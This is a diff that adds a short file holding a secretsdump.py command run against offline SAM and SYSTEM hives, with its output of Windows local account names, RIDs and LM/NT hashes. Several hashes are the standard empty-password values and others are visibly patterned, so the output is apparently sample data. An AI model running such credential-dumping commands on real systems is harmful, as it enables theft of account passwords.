@@ -1,0 +1,9 @@
+# secretsdump.py -sam sam.hiv -system system.hiv LOCAL
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+LocalUser01:1000:aad3b435b51404eeaad3b435b51404ee:a9d32d4c0628292850f38b4d8d1e2f3d:::
+ServiceAcc:1001:aad3b435b51404eeaad3b435b51404ee:b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6:::
+UserWithPassword:1002:aad3b435b51404eeaad3b435b51404ee:c9b8a7f6e5d4c3b2a190876543210fe9:::
